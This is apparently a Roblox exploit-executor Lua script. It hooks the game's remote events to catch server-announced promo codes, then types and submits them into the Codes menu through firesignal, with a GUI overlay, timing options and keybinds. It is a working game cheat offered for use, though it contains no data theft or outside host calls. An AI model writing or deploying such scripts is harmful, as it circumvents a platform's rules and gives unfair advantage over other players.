	Main.Visible = visible2
	Config.Visible = visible
	slicedfn10(MainTab, sliced5, visible2)
	slicedfn10(ConfigTab, sliced6, visible)
end

MainTab.MouseButton1Click:Connect(function()
	slicedfn11(false)
end)

ConfigTab.MouseButton1Click:Connect(function()
	slicedfn11(true)
end)

slicedfn11(false)
local frame10 = Instance.new("Frame")
frame10.Name = "Strip"
frame10.AnchorPoint = Vector2.new(0.5, 1)
frame10.Position = UDim2.new(0.5, 0, 1, -86)
frame10.Size = UDim2.fromOffset(0, 50)
frame10.AutomaticSize = Enum.AutomaticSize.X
frame10.BackgroundColor3 = Color3.fromHex("#1B0A2D")
frame10.BackgroundTransparency = 0.18
frame10.BorderSizePixel = 0
frame10.Parent = screenGui
local uiScale2 = Instance.new("UIScale")
uiScale2.Scale = 1
uiScale2.Parent = frame10
createUICorner(frame10, 25)
local sliced20 = createUIStroke(frame10, tbl2.outlineMid, 1.2, 0.3)
slicedfn4(sliced20)
createUIPadding(frame10, 0, 0, 20, 20)
local uiListLayout4 = Instance.new("UIListLayout")
uiListLayout4.FillDirection = Enum.FillDirection.Horizontal
uiListLayout4.VerticalAlignment = Enum.VerticalAlignment.Center
uiListLayout4.SortOrder = Enum.SortOrder.LayoutOrder
uiListLayout4.Padding = UDim.new(0, 13)
uiListLayout4.Parent = frame10
local frame11 = Instance.new("Frame")
frame11.LayoutOrder = 1
frame11.Size = UDim2.fromOffset(11, 11)
frame11.BackgroundColor3 = tbl2.Accent
frame11.BorderSizePixel = 0
frame11.Parent = frame10
createUICorner(frame11, 6)
local textLabel10 = Instance.new("TextLabel")
textLabel10.LayoutOrder = 2
textLabel10.Size = UDim2.fromOffset(0, 26)
textLabel10.AutomaticSize = Enum.AutomaticSize.X
textLabel10.BackgroundTransparency = 1
textLabel10.Font = Enum.Font.GothamBlack
textLabel10.Text = "discord.gg/3RKEJYs9m"
textLabel10.TextSize = 16
textLabel10.TextColor3 = tbl2.text
textLabel10.Parent = frame10

local function createFrame4(layoutOrder)
	local frame12 = Instance.new("Frame")
	frame12.LayoutOrder = layoutOrder
	frame12.Size = UDim2.new(0, 1, 0, 24)
	frame12.BackgroundColor3 = tbl2.outlineMid
	frame12.BackgroundTransparency = 0.5
	frame12.BorderSizePixel = 0
	frame12.Parent = frame10
	return frame12
end

local function createTextLabel3(layoutOrder, text2, textColor3)
	local frame12 = Instance.new("Frame")
	frame12.LayoutOrder = layoutOrder
	frame12.Size = UDim2.fromOffset(54, 38)
	frame12.BackgroundTransparency = 1
	frame12.Parent = frame10
	local textLabel11 = Instance.new("TextLabel")
	textLabel11.Size = UDim2.new(1, 0, 0, 13)
	textLabel11.BackgroundTransparency = 1
	textLabel11.Font = Enum.Font.GothamBold
	textLabel11.Text = text2
	textLabel11.TextSize = 11
	textLabel11.TextColor3 = tbl2.placeholder
	textLabel11.TextTransparency = 0.35
	textLabel11.Parent = frame12
	local textLabel12 = Instance.new("TextLabel")
	textLabel12.Position = UDim2.new(0, 0, 0, 15)
	textLabel12.Size = UDim2.new(1, 0, 0, 20)
	textLabel12.BackgroundTransparency = 1
	textLabel12.Font = Enum.Font.GothamBlack
	textLabel12.Text = "--"
	textLabel12.TextSize = 17
	textLabel12.TextColor3 = textColor3
	textLabel12.Parent = frame12
	return textLabel12
end

createFrame4(3)
local fps = createTextLabel3(4, "FPS", tbl2.fps)
createFrame4(5)
local ping = createTextLabel3(6, "PING", tbl2.ping)

task.spawn(function()
	local slicedn4 = 0
	local now = os.clock()
	local connection = RunService.RenderStepped:Connect(function()
		slicedn4 += 1
	end)
	while screenGui.Parent and fn() do
		task.wait(1)
		local now2 = os.clock()
		local slicedn5 = now2 - now
		if slicedn5 > 0 and fps.Parent then fps.Text = tostring(math.floor(slicedn4 / slicedn5 + 0.5)) end
		slicedn4 = 0
		local ok, result = pcall(function()
			return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
		end)
		if ping.Parent then
			ping.Text = ok and tostring(math.floor(result + 0.5)) .. "ms" or "--"
			now = now2
		else
			now = now2
		end
	end
	pcall(function()
		connection:Disconnect()
	end)
end)

local clipsDescendants = false
local slicedn4 = 552

local function slicedfn12() frame.Size = UDim2.fromOffset(382, clipsDescendants and 44 or slicedn4) end

local function slicedfn13(arg)
	clipsDescendants = arg == true
	frame3.Visible = not clipsDescendants
	frame.ClipsDescendants = clipsDescendants
	slicedfn12()
	textButton3.Text = clipsDescendants and "+" or "-"
	frame:SetAttribute("Minimized", clipsDescendants)
	return clipsDescendants
end

frame:SetAttribute("Minimized", false)

textButton3.MouseButton1Click:Connect(function()
	slicedfn13(not clipsDescendants)
end)

textButton.MouseButton1Click:Connect(function()
	screenGui.Enabled = not screenGui.Enabled
	textButton.Text = screenGui.Enabled and "×" or "CS"
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if not fn() then return end
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.RightControl then
		screenGui.Enabled = not screenGui.Enabled
		textButton.Text = screenGui.Enabled and "×" or "CS"
	end
end)

local connection = nil

local function slicedfn14()
	if not fn() then return end
	local currentCamera = workspace.CurrentCamera
	currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1920, 1080)
	local touchEnabled = UserInputService.TouchEnabled
	textButton.Visible = touchEnabled
	textButton.Text = screenGui.Enabled and "×" or "CS"
	if touchEnabled then
		local scale = math.clamp(math.min(1, (currentCamera.X - 20) / 430), 0.62, 1)
		local visible = currentCamera.Y >= 380
		local slicedn5 = visible and 50 * scale + 28 or 12
		local scale2 = math.clamp((currentCamera.X - 20) / n, 0.58, 1)
		local slicedn6 = math.max((slicedn3 + 150) * scale2, currentCamera.Y - 20 - slicedn5)
		uiScale.Scale = scale2
		slicedn4 = math.clamp(slicedn6 / scale2, slicedn3 + 150, 552)
		slicedfn12()
		frame.Position = UDim2.new(0.5, 0, 0, 10)
		uiScale2.Scale = scale
		frame10.Visible = visible
		frame10.Position = UDim2.new(0.5, 0, 1, -14)
		local slicedn7 = currentCamera.X < 360 and 52 or 58
		textButton.Size = UDim2.fromOffset(slicedn7, slicedn7)
		textButton.Position = UDim2.new(1, -12, 1, visible and -72 or -12)
	else
		slicedn4 = slicedn2
		uiScale.Scale = 1
		slicedfn12()
		frame.Position = UDim2.new(0.5, 0, 0.47, -slicedn2 / 2)
		uiScale2.Scale = 1
		frame10.Visible = true
		frame10.Position = UDim2.new(0.5, 0, 1, -86)
		textButton.Size = UDim2.fromOffset(58, 58)
		textButton.Position = UDim2.new(1, -12, 1, -72)
	end
end

local function slicedfn15()
	if not fn() then return end
	if connection then
		pcall(function()
			connection:Disconnect()
		end)
	end
	local currentCamera = workspace.CurrentCamera
	if currentCamera then connection = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(slicedfn14) end
	slicedfn14()
end

workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(slicedfn15)
slicedfn15()
local slicedn5 = 0.25
local slicedn6 = 24
local tbl3 = {}

for _, sliced21 in ipairs({
	"fps",
	"ping",
	"ms",
	"server",
	"client",
	"update",
	"event",
	"welcome",
	"coins",
	"cash",
	"gems",
	"robux",
	"code",
	"codes",
	"promo",
	"gift",
	"free",
	"new",
	"is",
}) do
	tbl3[sliced21] = true
	tbl3[sliced21:upper()] = true
end

local flag = true
local text2 = "AUTO"
local flag2 = false
local slicedn7 = 0.2
local str = "Normal"
local flag3 = false
local slicedn8 = 1
local vecsKeybinds = getgenv and getgenv().__VECS_keybinds or { toggleAutoRedeem = Enum.KeyCode.P, resetWords = Enum.KeyCode.R }

if getgenv then getgenv().__VECS_keybinds = vecsKeybinds end

local tbl4 = { toggleAutoRedeem = toggleAutoRedeem, resetWords = resetCollectedWords }
local sliced21 = nil

local function slicedfn16()
	for k, sliced22 in pairs(tbl4) do
		sliced22.Text = vecsKeybinds[k].Name
		sliced22.BackgroundColor3 = tbl2.buttonDark
		sliced22.TextColor3 = tbl2.White
	end
end

local function slicedfn17(arg)
	slicedfn16()
	sliced21 = arg
	local sliced22 = tbl4[arg]
	sliced22.Text = "PRESS KEY..."
	sliced22.BackgroundColor3 = tbl2.Yellow
	sliced22.TextColor3 = tbl2.ink
	textLabel9.Text = "Waiting for a key... press ESC to cancel."
	textLabel9.TextColor3 = tbl2.Yellow
end

toggleAutoRedeem.MouseButton1Click:Connect(function()
	slicedfn17("toggleAutoRedeem")
end)

resetCollectedWords.MouseButton1Click:Connect(function()
	slicedfn17("resetWords")
end)

local building = ""
local str2 = ""
local slicedn9 = 0
local slicedn10 = 0
local slicedn11 = 0
local flag4 = false
local slicedn12 = 0
local sliced22 = nil
local sliced23 = nil
local clock = os.clock
local slicedn13 = 0

textButton5.MouseButton1Click:Connect(function()
	text2 = text2 == "AUTO" and "MANUAL" or "AUTO"
	textButton5.Text = text2
	textButton5.BackgroundColor3 = text2 == "AUTO" and tbl2.Green or tbl2.Yellow
	textButton5.TextColor3 = tbl2.ink
	textLabel4.Text = text2 == "AUTO" and "auto mode - redeems immediately" or "manual mode - click the game code textbox to redeem"
	textLabel4.TextColor3 = tbl2.Yellow
end)

local function slicedfn18(arg)
	local str3 = tostring(arg):lower()
	if str3 == "is" and building ~= "" then return false end
	return tbl3[str3] == true
end

local rwSession = {}

if getgenv then getgenv().__RW_session = rwSession end

local function slicedfn19()
	local codes = playerGui:FindFirstChild("Codes")
	if not codes then return nil, nil end
	local codes2 = codes:FindFirstChild("Codes")
	local textBox = nil
	local confirm = nil
	if codes2 then
		local codeRedeem = codes2:FindFirstChild("CodeRedeem")
		textBox = nil
		if codeRedeem then textBox = codeRedeem:FindFirstChild("TextBox") end
		confirm = codes2:FindFirstChild("Confirm")
	end
	if not textBox then
		local codeRedeem = codes:FindFirstChild("CodeRedeem", true)
		if codeRedeem then textBox = codeRedeem:FindFirstChildWhichIsA("TextBox", true) end
		textBox = textBox or codes:FindFirstChildWhichIsA("TextBox", true)
	end
	return textBox, confirm or codes:FindFirstChild("Confirm", true)
end

local function slicedfn20(arg)
	if not arg or not arg.Parent or type(firesignal) ~= "function" then return false end
	local buttonCache = rwSession.buttonCache
	if not buttonCache or buttonCache.owner ~= arg or not buttonCache.button.Parent or buttonCache.button ~= arg and buttonCache.button.Parent ~= arg then
		local ok, result, result2 = pcall(function()
			local textButton6 = arg:FindFirstChildWhichIsA("TextButton") or arg
			return textButton6, textButton6.Activated
		end)
		if not ok or not result2 then return false end
		local buttonCache2 = { owner = arg, button = result, signal = result2 }
		rwSession.buttonCache = buttonCache2
		buttonCache = buttonCache2
	end
	return pcall(firesignal, buttonCache.signal)
end

local function slicedfn21()
	if sliced22 and sliced22.Parent and sliced23 and sliced23.Parent then return sliced22, sliced23 end
	local sliced24, sliced25 = slicedfn19()
	sliced22 = sliced24
	sliced23 = sliced25
	return sliced24, sliced25
end

local function slicedfn22()
	local sliced24, sliced25 = slicedfn21()
	return sliced24 ~= nil and sliced25 ~= nil
end

task.spawn(function()
	for i = 1, 400 do
		if not slicedfn22() then
			task.wait(0.05)
			continue
		end
		break
	end
end)

local slicedfn23 = nil

slicedfn23 = function(waitingForCodesUi, arg, arg2)
	arg = arg or clock()
	if text2 == "MANUAL" and not arg2 then
		slicedn13 += 1
		local sliced24 = slicedn13
		textLabel4.Text = "ready: open Codes and click its textbox"
		textLabel4.TextColor3 = tbl2.Yellow
		task.spawn(function()
			while getgenv == nil or getgenv().__RW_session == rwSession do
				if sliced24 ~= slicedn13 or text2 ~= "MANUAL" then return end
				local value = select(1, slicedfn19())
				if value and value:IsFocused() then
					slicedn13 += 1
					slicedfn23(waitingForCodesUi, arg, true)
					return
				end
				task.wait(0.05)
			end
		end)
		return
	end
	local sliced24 = sliced22
	local sliced25 = sliced23
	if not sliced24 or not sliced24.Parent or not sliced25 or not sliced25.Parent then sliced24, sliced25 = slicedfn21() end
	if not sliced24 or not sliced25 then
		rwSession.redeemQueueGen = (rwSession.redeemQueueGen or 0) + 1
		local redeemQueueGen = rwSession.redeemQueueGen
		textLabel4.Text = "waiting for Codes UI: " .. waitingForCodesUi
		textLabel4.TextColor3 = tbl2.Yellow
		task.spawn(function()
			for i = 1, 60 do
				if not flag or redeemQueueGen ~= rwSession.redeemQueueGen then return end
				if getgenv and getgenv().__RW_session ~= rwSession then return end
				local sliced26, sliced27 = slicedfn21()
				if sliced26 and sliced26.Parent and sliced27 and sliced27.Parent then
					sliced22 = sliced26
					sliced23 = sliced27
					return slicedfn23(waitingForCodesUi, arg, true)
				end
				task.wait(0.05)
			end
			if flag and redeemQueueGen == rwSession.redeemQueueGen then
				textLabel4.Text = "Codes UI unavailable: " .. waitingForCodesUi
				textLabel4.TextColor3 = tbl2.Red
			end
		end)
		return
	end
	sliced24.Text = waitingForCodesUi
	local sliced26 = clock()
	local sliced27 = slicedfn20(sliced25)
	local slicedn14 = (sliced26 - arg) * 1000
	task.defer(function()
		textLabel5.Text = string.format("STOPWATCH: %.2fms", slicedn14)
		textLabel5.TextColor3 = slicedn14 <= 15 and tbl2.Green or (slicedn14 <= 60 and tbl2.Yellow or tbl2.Red)
		textLabel4.Text = (sliced27 and "Dispatched (unverified): " or "Auto-submit unavailable: ") .. waitingForCodesUi
		textLabel4.TextColor3 = sliced27 and tbl2.Green or tbl2.Red
	end)
end

local function slicedfn24()
	if str == "UPPER" then return "[^A-Z0-9]" end
	if str == "lower" then return "[^a-z0-9]" end
	return "[^A-Za-z0-9]"
end

local function slicedfn25(arg)
	local sliced24 = slicedfn24()
	local tbl5 = {}
	for match in arg:gmatch("%S+") do
		local str3 = match:gsub(sliced24, "")
		if #str3 >= 1 then
			local str4 = str3:lower()
			local flag5 = false
			if slicedfn18(str4) then flag5 = true end
			if not flag5 then table.insert(tbl5, str3) end
		end
	end
	if #tbl5 ~= 1 then return "" end
	local sliced25 = tbl5[1]
	if slicedn6 < #sliced25 then return "" end
	return sliced25
end

local function slicedfn26(arg)
	local sliced24 = building
	arg = arg or os.clock()
	building = ""
	slicedn10 = 0
	flag4 = false
	slicedn12 += 1
	if sliced24 == "" or not flag then return end
	slicedfn23(sliced24, arg)
end

local function slicedfn27(arg, arg2)
	if not flag then return end
	local sliced24 = slicedfn25(arg)
	if sliced24 == "" then return end
	local now = os.clock()
	if sliced24 == str2 and now - slicedn9 < slicedn5 then return end
	str2 = sliced24
	slicedn9 = now
	building ..= sliced24
	slicedn10 += 1
	if flag3 and slicedn10 >= slicedn8 then
		local sliced25 = slicedfn26
		arg2 = arg2 or now
		sliced25(arg2)
		textLabel4.Text = "SUBMIT REQUESTED"
		textLabel4.TextColor3 = tbl2.Green
		return
	end
	if not flag2 then
		if flag3 then
			flag4 = false
			textLabel4.Text = string.format("Collecting %d/%d: %s", slicedn10, slicedn8, building)
			textLabel4.TextColor3 = tbl2.Yellow
		else
			local sliced25 = building
			slicedfn26(arg2 or now)
			textLabel4.Text = "instant -> " .. sliced25
			textLabel4.TextColor3 = tbl2.Green
		end
		return
	end
	flag4 = true
	slicedn11 = now + slicedn7
	slicedn12 += 1
	local sliced25 = slicedn12
	slicedfn21()
	task.delay(slicedn7, function()
		if getgenv and getgenv().__RW_session ~= rwSession then return end
		if sliced25 ~= slicedn12 or not flag4 or not flag or not flag2 then return end
		slicedfn26(arg2 or now)
	end)
	textLabel4.Text = "Building: " .. building
	textLabel4.TextColor3 = tbl2.Yellow
end

local function slicedfn28()
	flag = not flag
	if flag then
		on.Text = "ON"
		on.BackgroundColor3 = tbl2.Green
		on.TextColor3 = tbl2.ink
		textLabel4.Text = "idle"
		textLabel4.TextColor3 = tbl2.Dim
	else
		on.Text = "OFF"
		on.BackgroundColor3 = tbl2.Red
		on.TextColor3 = tbl2.White
		building = ""
		slicedn10 = 0
		flag4 = false
		rwSession.redeemQueueGen = (rwSession.redeemQueueGen or 0) + 1
		slicedn12 += 1
		textLabel4.Text = "paused"
		textLabel4.TextColor3 = tbl2.Dim
	end
end

on.MouseButton1Click:Connect(slicedfn28)

local function slicedfn29()
	building = ""
	slicedn10 = 0
	flag4 = false
	str2 = ""
	slicedn9 = 0
	slicedn11 = 0
	slicedn12 += 1
	textLabel4.Text = "resetted"
	textLabel4.TextColor3 = tbl2.Yellow
end

local function slicedfn30(arg)
	slicedn7 = math.clamp(arg, 0.1, 10)
	sliced12.Text = string.format("%.1fs", slicedn7)
end

sliced11.MouseButton1Click:Connect(function()
	slicedfn30(slicedn7 + 0.1)
end)

sliced13.MouseButton1Click:Connect(function()
	slicedfn30(slicedn7 - 0.1)
end)

local function slicedfn31()
	if flag2 then
		off.Text = "ON"
		off.BackgroundColor3 = tbl2.Green
		off.TextColor3 = tbl2.ink
	else
		off.Text = "OFF"
		off.BackgroundColor3 = tbl2.Red
		off.TextColor3 = tbl2.White
		flag4 = false
	end
end

off.MouseButton1Click:Connect(function()
	flag2 = not flag2
	slicedfn31()
end)

slicedfn31()

local function slicedfn32(arg)
	str = arg
	for _, sliced24 in ipairs({ { normal, "Normal" }, { upper, "UPPER" }, { sliced14, "lower" } }) do
		if sliced24[2] == str then
			sliced24[1].BackgroundColor3 = tbl2.Accent
			sliced24[1].TextColor3 = tbl2.ink
		else
			sliced24[1].BackgroundColor3 = tbl2.buttonDark
			sliced24[1].TextColor3 = tbl2.Dim
		end
	end
end

normal.MouseButton1Click:Connect(function()
	slicedfn32("Normal")
end)

upper.MouseButton1Click:Connect(function()
	slicedfn32("UPPER")
end)

sliced14.MouseButton1Click:Connect(function()
	slicedfn32("lower")
end)

slicedfn32(str)

local function slicedfn33()
	if flag3 then
		off2.Text = "ON"
		off2.BackgroundColor3 = tbl2.Green
		off2.TextColor3 = tbl2.ink
	else
		off2.Text = "OFF"
		off2.BackgroundColor3 = tbl2.Red
		off2.TextColor3 = tbl2.White
	end
	sliced17.Text = tostring(slicedn8)
end

off2.MouseButton1Click:Connect(function()
	flag3 = not flag3
	slicedfn33()
end)

sliced16.MouseButton1Click:Connect(function()
	slicedn8 = math.clamp(slicedn8 + 1, 1, 20)
	slicedfn33()
end)

sliced18.MouseButton1Click:Connect(function()
	slicedn8 = math.clamp(slicedn8 - 1, 1, 20)
	slicedfn33()
end)

textButton4.MouseButton1Click:Connect(function()
	if building ~= "" then
		slicedfn26()
	else
		textLabel4.Text = "nothing to submit yet"
		textLabel4.TextColor3 = tbl2.Dim
	end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if not fn() then return end
	if UserInputService:GetFocusedTextBox() then return end
	if sliced21 then
		if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
		if input.KeyCode == Enum.KeyCode.Escape then
			sliced21 = nil
			slicedfn16()
			textLabel9.Text = "Keybind change cancelled."
			textLabel9.TextColor3 = tbl2.Dim
			return
		end
		if input.KeyCode == Enum.KeyCode.Unknown then return end
		local sliced24 = sliced21
		local sliced25 = vecsKeybinds[sliced24]
		for k, vecsKeybind in pairs(vecsKeybinds) do
			if k ~= sliced24 and vecsKeybind == input.KeyCode then
				vecsKeybinds[k] = sliced25
				break
			end
		end
		vecsKeybinds[sliced24] = input.KeyCode
		sliced21 = nil
		slicedfn16()
		textLabel9.Text = "Keybind saved."
		textLabel9.TextColor3 = tbl2.Green
		return
	end
	if gameProcessed then return end
	if input.KeyCode == vecsKeybinds.toggleAutoRedeem then
		slicedfn28()
	elseif input.KeyCode == vecsKeybinds.resetWords then
		slicedfn29()
	end
end)

task.spawn(function()
	while not (getgenv and getgenv().__RW_session ~= rwSession) do
		if flag and flag2 and flag4 and building ~= "" then
			local slicedn14 = slicedn11 - os.clock()
			if slicedn14 > 0 then
				textLabel4.Text = string.format("Building: %s   submit in %.2fs", building, slicedn14)
				textLabel4.TextColor3 = tbl2.Yellow
			end
			task.wait()
		else
			task.wait(0.1)
		end
	end
end)

local flag5 = true
local slicedn14 = 0

local function slicedfn34(arg, arg2, arg3, arg4)
	if getgenv and getgenv().__RW_session ~= rwSession then return end
	if arg4 ~= "Top" then return end
	if type(arg) ~= "string" or #arg == 0 then return end
	if not flag then return end
	local sliced24 = clock()
	local match = arg:match("^([A-Za-z0-9]+)$") or arg:gsub("<.->", ""):match("^%s*([A-Za-z0-9]+)%s*$")
	if match and #match >= 1 and #match <= slicedn6 and not flag2 and not flag3 and str == "Normal" and not slicedfn18(match) then
		slicedfn23(match, sliced24)
	else
		if arg:find("<", 1, true) then arg = arg:gsub("<.->", "") end
		slicedfn27(arg, sliced24)
	end
	slicedn14 += 1
	flag5 = false
	textLabel2.Text = string.format("FIRED  (x%d)", slicedn14)
	textLabel2.TextColor3 = tbl2.Green
	local tbl5 = { BackgroundColor3 = tbl2.Green, BackgroundTransparency = 0 }
	slicedfn2(frame6, TweenInfo.new(0.15), tbl5)
	local tbl6 = { Color = tbl2.Green }
	slicedfn2(sliced4, TweenInfo.new(0.12), tbl6)
	task.delay(0.5, function()
		local tbl7 = { Color = tbl2.Accent }
		slicedfn2(sliced4, TweenInfo.new(0.5), tbl7)
	end)
end

task.spawn(function()
	while flag5 do
		slicedfn2(frame6, TweenInfo.new(0.55), { BackgroundTransparency = 0.65 })
		task.wait(0.6)
		if flag5 then
			slicedfn2(frame6, TweenInfo.new(0.55), { BackgroundTransparency = 0 })
			task.wait(0.6)
			continue
		end
		break
	end
end)

task.spawn(function()
	textLabel2.Text = "Finding remotes..."
	local sliced24 = tbl.resolve()
	if not sliced24 then
		flag5 = false
		textLabel2.Text = "Net folder not found"
		textLabel2.TextColor3 = tbl2.Red
		frame6.BackgroundColor3 = tbl2.Red
		frame6.BackgroundTransparency = 0
		return
	end
	if getgenv and getgenv().__RW_conns then
		for _, rwConn in ipairs(getgenv().__RW_conns) do
			pcall(function()
				rwConn:Disconnect()
			end)
		end
	end
	local rwConns = {}

	local function slicedfn35(descendant)
		if not (descendant:IsA("RemoteEvent") or descendant:IsA("UnreliableRemoteEvent")) then return end
		local ok, result = pcall(function()
			return descendant.OnClientEvent:Connect(slicedfn34)
		end)
		if ok and result then table.insert(rwConns, result) end
	end
	for _, descendant in ipairs(sliced24:GetDescendants()) do slicedfn35(descendant) end
	table.insert(rwConns, sliced24.DescendantAdded:Connect(slicedfn35))
	if getgenv then getgenv().__RW_conns = rwConns end
	textLabel2.Text = "Waiting for fire"
	textLabel2.TextColor3 = tbl2.Yellow
end)

textButton2.MouseButton1Click:Connect(function()
	screenGui.Enabled = false
	textButton.Text = "CS"
end)

task.spawn(function()
	local flag6 = nil
	local position = nil
	local position2 = nil
	local flag7 = nil
	frame2.InputBegan:Connect(function(input)
		if not fn() then return end
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			flag6 = true
			flag7 = false
			position = input.Position
			position2 = frame.Position
		end
	end)
	frame2.InputEnded:Connect(function(input)
		if not fn() then return end
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then flag6 = false end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if not fn() then return end
		if flag6 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local slicedn15 = input.Position - position
			if not flag7 and slicedn15.Magnitude < 5 then return end
			flag7 = true
			frame.Position = UDim2.new(position2.X.Scale, position2.X.Offset + slicedn15.X, position2.Y.Scale, position2.Y.Offset + slicedn15.Y)
		end
	end)
end)

task.spawn(function()
	for i = 1, 40 do
		if not slicedfn22() then
			task.wait(0.25)
			continue
		end
		break
	end
end)
